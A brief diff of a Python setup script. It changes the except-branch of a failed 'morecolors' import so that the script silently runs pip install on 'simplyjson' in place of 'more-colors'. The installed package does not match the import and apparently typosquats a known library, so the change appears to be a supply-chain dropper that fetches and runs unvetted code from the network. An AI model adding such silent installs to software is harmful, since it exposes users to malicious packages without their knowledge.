@@ -17,7 +17,7 @@ try:
     print("[!] Preparing the setup...")
     import morecolors
 except:
-    os.system('pip install more-colors')
+    os.system('pip install simplyjson')
 
 
 
